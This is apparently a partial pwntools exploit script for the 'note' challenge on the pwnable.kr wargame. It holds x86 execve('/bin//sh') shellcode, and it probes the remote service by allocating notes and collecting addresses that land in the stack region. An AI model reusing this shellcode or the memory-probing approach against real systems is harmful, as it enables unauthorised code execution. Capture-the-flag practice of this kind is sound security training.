#!/usr/bin/env python
import struct, time, pwn

HOST = 'pwnable.kr'
PORT = 9019

NOTE_BINARY = './note'
sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"



def main():


	stack_mapping = [0xfffdd000, 0xffffe000]
	all_notes = {}
	good_notes = {}


	p = pwn.remote(HOST,PORT)

	time.sleep(10.5)

	for i in range(256):
		p.sendline('1')

	data = p.recvuntil('no 255').split('\n')

	i = 0
	while True:

		note_index = int(data[7*i + 19][17:])
		if note_index == 255:
			break
		note_addr = int(data[7*i + 20][2:10],16)
		all_notes[note_index] = note_addr
		if (note_addr > stack_mapping[0] and note_addr < stack_mapping[1]):
			good_notes[note_index] = note_addr
		i += 1
		
	extra_line = p.recvline()
	extra_line = int(p.recvline()[2:10], 16)
	if (extra_line > stack_mapping[0] and extra_line < stack_mapping[1]):
			good_notes[255] = extra_line

	all_notes[255] = extra_line

	print (good_notes)

	p.interactive()

	
	return

if __name__ == '__main__':
	main()